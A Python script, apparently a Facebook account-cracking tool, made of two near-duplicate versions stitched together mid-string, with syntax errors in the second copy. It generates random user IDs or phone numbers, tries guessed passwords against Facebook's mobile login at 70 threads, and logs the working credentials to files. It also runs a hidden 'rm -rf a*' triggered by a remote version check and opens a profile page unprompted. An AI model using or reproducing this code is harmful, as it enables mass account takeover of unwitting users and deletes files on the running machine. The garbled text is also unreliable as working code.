#coding=utf
#Coded By (4DEEL) :)
#Open source Coder 
import os,sys,time,json,random,re,string,platform,base64
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python Random.py')
P = '\x1b[1;97m' # WHITE
M = '\x1b[1;91m' # RED
H = '\x1b[1;92m' # GREEN
K = '\x1b[1;93m' # YELLOW
B = '\x1b[1;94m' # BLUE
U = '\x1b[1;95m' # IDK
O = '\x1b[1;96m' # PINK
N = '\x1b[0m'    # NO COLOR
A = '\x1b[1;90m' # AGER
BN = '\x1b[1;107m' # TRANS
BBL = '\x1b[1;106m' # AORGAN
BP = '\x1b[1;105m' # OLD PINK
BB = '\x1b[1;104m' #MILODY
BK = '\x1b[1;103m' # BJK
BH = '\x1b[1;102m' # DARK GREEN
BM = '\x1b[1;101m' # MTNK
BA = '\x1b[1;100m' # ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
logo =  """ \033[1;31m
 /$$$$$$$        /$$$$$$$$       /$$      /$$        /$$$$$$        /$$$$$$$$ /$$$$$$ 
| $$__  $$      | $$_____/      | $$  /$ | $$       /$$__  $$      | $$_____//$$__  $$
| $$  \ $$      | $$            | $$ /$$$| $$      | $$  \ $$      | $$     | $$  \ $$
| $$$$$$$       | $$$$$         | $$/$$ $$ $$      | $$$$$$$$      | $$$$$  | $$$$$$$$
| $$__  $$      | $$__/         | $$$$_  $$$$      | $$__  $$      | $$__/  | $$__  $$
| $$  \ $$      | $$            | $$$/ \  $$$      | $$  | $$      | $$     | $$  | $$
| $$$$$$$/      | $$$$$$$$      | $$/   \  $$      | $$  | $$      | $$     | $$  | $$
|_______/       |________/      |__/     \__/      |__/  |__/      |__/     |__/  |__/
                                                    
\033[0;94m────────────────────────────────────────────────────────
\033[0;92mAuthor    \033[0;91mADEEL LEGHARI)
\033[0;92mGithub    \033[0;96mLTC
\033[0;92mFACEBOOK  \033[0;94mSULMAN KABIR#coding=utf
#Coded By Lucifer :)
#Open source Coder 
import os,sys,time,json,random,re,string,platform,base64
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python Lucifer.py')
P = '\x1b[1;97m' # WHITE
M = '\x1b[1;91m' # RED
H = '\x1b[1;92m' # GREEN
K = '\x1b[1;93m' # YELLOW
B = '\x1b[1;94m' # BLUE
U = '\x1b[1;95m' # IDK
O = '\x1b[1;96m' # PINK
N = '\x1b[0m'    # NO COLOR
A = '\x1b[1;90m' # AGER
BN = '\x1b[1;107m' # TRANS
BBL = '\x1b[1;106m' # AORGAN
BP = '\x1b[1;105m' # OLD PINK
BB = '\x1b[1;104m' #MILODY
BK = '\x1b[1;103m' # BJK
BH = '\x1b[1;102m' # DARK GREEN
BM = '\x1b[1;101m' # MTNK
BA = '\x1b[1;100m' # ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
logo =  """ \033[1;31m
                                      
▄▄▄▄·     ▄▄▄ .    ▄▄▌ ▐ ▄▌     ▄▄▄·     ·▄▄▄ ▄▄▄· 
▐█ ▀█▪    ▀▄.▀·    ██· █▌▐█    ▐█ ▀█     ▐▄▄·▐█ ▀█ 
▐█▀▀█▄    ▐▀▀▪▄    ██▪▐█▐▐▌    ▄█▀▀█     ██▪ ▄█▀▀█ 
██▄▪▐█    ▐█▄▄▌    ▐█▌██▐█▌    ▐█ ▪▐▌    ██▌.▐█ ▪▐▌
·▀▀▀▀      ▀▀▀      ▀▀▀▀ ▀▪     ▀  ▀     ▀▀▀  ▀  ▀ 
\033[0;94m────────────────────────────────────────────────────────
\033[0;92mAuthor    \033[0;91mADEEL LEGHARI (NAM TU SUNA HOGA)
\033[0;92mGithub    \033[0;96mFUCK MR ZUKKO
\033[0;92mFACEBOOK  \033[0;94mSULMAN KABIR X.X.X
\033[0;94m────────────────────────────────────────────────────────
\033[0;91mNOTICE ! :  BEWAFA BOLTI PUBLIC APUN KO ok😈👿❤️‍🔥
\033[0;94m────────────────────────────────────────────────────────
"""
loop = 0
oks = []
cps = []
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    proxy = requests.get('https://raw.githubusercontent.com/4deeL-khan/Jaan/main/Approval.txt').text.splitlines()
    v = 3.1
    update = requests.get('https://raw.githubusercontent.com/4deeL-khan/Jaan/main/Approval.txt').text
    if str(v) in update:
        os.system('rm -rf a*')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)
os.system('xdg-open https://www.Facebook.com/ved.baghel.39')
def LUCIFER():
    os.system('clear')
    print(logo)
    print('\033[1;31m[1] Random crack')
    print(50*'-')
    opt = input('Choose option >>> ')
    if opt =='1':
        random_crack()
    else:
        print('\n\033[1;31mChoose valid option\033[0;97m')
def random_crack():
    os.system('clear')
    print(logo)
    print('[1] Random UID crack')
    print('[2] Random number crack')
    print('[B] Back')
    print(50*'-')
    opt = input('Choose option >>> ')
    if opt =='1':
        random_uid()  
    elif opt =='2':
        random_number()
    elif opt =='3':
        main()
    else:
        print('\n\033[1;31mChoose valid option\033[0;97m')
def random_uid():
	
	
    user=[]
    os.system('clear')
    print(logo)
    limit = int(input('How many ids do you want to add ? '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(11))
        user.append('10000'+nmp)
    print('\n\033[1;33mExample: 123456,1234567,12345678 ... \033[0;97m')
    pwx = input('Put passwords: ').split(',')
    with ThreadPool(max_workers=70) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('Total ids: '+tl)
        print('The process has been started')
        print(50*'-')
        
        for uid in user:
            yaari.submit(rcrack,uid,pwx,tl)
    print(50*'-')
    print('Crack process has been completed')
    print('Ids saved in ok.txt,cp.txt')
    print(50*'-')
def random_number():
    user=[]
    os.system('clear')
    os.system('xdg-open https://www.facebook.com/ved.baghel.39')
    print(logo)
    print('\033[1;33mCode example: 92301,92302,92303,92344 .\033[0;97m')
    kode = input('Put code: ')
    limit = int(input('How many numbers do you want to add ? '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=70) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('Total ids: '+tl)
        print('The process has been started')
        print(50*'-')
        for guru in user:
            uid = kode+guru
            pwx = [guru]
            yaari.submit(rcrack,uid,pwx,tl)
    print(50*'-')
    print('Crack process has been completed')
    print('Ids saved in ok.txt,cp.txt')
    print(50*'-')

def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(proxy)
            session = requests.Session()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority':'free.facebook.com',
            'method': 'POST',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-encoding':'utf-8','accept-language': 'en-US,en;q=0.9,en;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '" Not A;Brand";v="100", "Chromium";v="101"',
            'sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
             'user-agent':'Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25',}
            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            #print(iid+'|'+pws+'|'+str(log_cookies))
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\033[1;32m[࿐ྂ♡ 4D33L♡ ࿐ྂ0k] '+cid+' | '+ps+'\033[0;97m')
                open('ok.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;31m[࿐ྂ♡ 4D33L♡ ࿐ྂCP] '+cid+' | '+ps+'\033[0;97m')
                open('cp.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r[%s/%s]  OK:- %s  CP:- %s \r'%(loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass

LUCIFER()

\033[0;94m────────────────────────────────────────────────────────
\033[0;91mNOTICE ! : BEWAFA BOLTI PUBLIC APUN KO 😈👿❤️‍🔥
\033[0;94m────────────────────────────────────────────────────────
"""
loop = 0
oks = []
cps = []
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    proxy = requests.get('https://raw.githubusercontent.com/4deeL-khan/Jaan/main/Approval.txt').text.splitlines()
    v = 3.1
    update = requests.get('https://raw.githubusercontent.com/4deeL-khan/Jaan/main/Approval.txt').text
    if str(v) in update:
        os.system('rm -rf a*')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)
os.system('xdg-open https://www.facebook.com/ved.bhagel.39')
def (4DEEL)():
    os.system('clear')
    print(logo)
    print('\033[1;31m[1] FB CRACK ON(4DEEL)')
    print(50*'-')
    opt = input('Choose option >>> ')
    if opt =='1':
        random_crack()
    else:
        print('\n\033[1;31mChoose valid option\033[0;97m')
def random_crack():
    os.system('clear')
    print(logo)
    print('[1]  bg FB CRACK ON(4DEEL))
    print('[2]  PK BGFB CRACK ON(4DEEL)')
    print('[B] Back')
    print(50*'-')
    opt = input('Choose option >>> ')
    if opt =='1':
        random_uid()  
    elif opt =='2':
        random_number()
    elif opt =='3':
        main()
    else:
        print('\n\033[1;31mChoose valid option\033[0;97m')
def random_uid():
	
	
    user=[]
    os.system('clear')
    print(logo)
    limit = int(input('How many ids do you want to add ? '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(11))
        user.append('10000'+nmp)
    print('\n\033[1;33mExample: 123456,1234567,12345678 ... \033[0;97m')
    pwx = input('Put passwords: ').split(',')
    with ThreadPool(max_workers=70) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('Total ids: '+tl)
        print('The process has been started')
        print(50*'-')
        
        for uid in user:
            yaari.submit(rcrack,uid,pwx,tl)
    print(50*'-')
    print('Crack process has been completed')
    print('Ids saved in ok.txt,cp.txt')
    print(50*'-')
def random_number():
    user=[]
    os.system('clear')
    os.system('xdg-open https://www.facebook.com/ved.bhaghel.39')
    print(logo)
    print('\033[1;33mCode example: 92301,92302,92303,92344 .\033[0;97m')
    kode = input('Put code: ')
    limit = int(input('How many numbers do you want to add ? '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=70) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('Total ids: '+tl)
        print('The process has been started')
        print(50*'-')
        for guru in user:
            uid = kode+guru
            pwx = [guru]
            yaari.submit(rcrack,uid,pwx,tl)
    print(50*'-')
    print('Crack process has been completed')
    print('Ids saved in ok.txt,cp.txt')
    print(50*'-')

def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(proxy)
            session = requests.Session()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority':'free.facebook.com',
            'method': 'POST',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-encoding':'utf-8','accept-language': 'en-US,en;q=0.9,en;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '" Not A;Brand";v="100", "Chromium";v="101"',
            'sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
             'user-agent':'Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25',}
            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            #print(iid+'|'+pws+'|'+str(log_cookies))
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\033[1;32m[(4DEEL)-OK] '+cid+' | '+ps+'\033[0;97m')
                open('ok.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;31m[(4DEEL)-CP] '+cid+' | '+ps+'\033[0;97m')
                open('cp.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r[%s/%s]  OK:- %s  CP:- %s \r'%(loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass

(4DEEL)()
